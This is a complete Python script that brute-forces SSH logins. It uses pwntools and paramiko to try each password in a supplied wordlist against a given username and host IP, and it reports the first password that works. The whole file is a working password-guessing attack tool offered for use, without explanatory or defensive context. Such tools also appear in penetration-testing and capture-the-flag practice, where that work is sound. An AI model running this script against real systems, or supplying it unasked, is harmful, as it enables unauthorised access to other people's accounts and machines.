from pwn import *
import paramiko

if len(sys.argv) < 4:
	print("Usage:\npython3 ssh-brute-force.py [username] [password list] [host ip]")
	sys.exit(0)

username = sys.argv[1]
password_list=sys.argv[2]
host = sys.argv[3]
attempt = 1

with open(password_list, "r") as f:
	for password in f:
		password = password.strip("\n")
		try:
			print("[{}] Attempting username: '{}' password:  '{}'".format(attempt,username,password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[:)] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password")
		except paramiko.ssh_exception.SSHException as e:
		 	print(e)
		attempt += 1
